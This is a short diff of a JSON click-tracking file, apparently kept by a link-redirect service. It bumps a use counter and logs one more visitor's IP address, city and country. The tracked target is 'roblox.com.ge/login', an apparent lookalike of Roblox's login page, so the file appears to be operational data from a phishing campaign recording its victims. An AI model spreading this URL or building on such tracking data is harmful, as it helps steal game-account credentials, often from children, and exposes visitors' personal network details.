@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1177,
+    "useCount": 1178,
     "createdBy": "admin",
     "clicks": [
       {
@@ -9560,6 +9560,14 @@
         "city": "Davao City",
         "flag": "🇵🇭",
         "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777296217972,
+        "ip": "77.111.246.40",
+        "country": "United States",
+        "city": "Washington",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
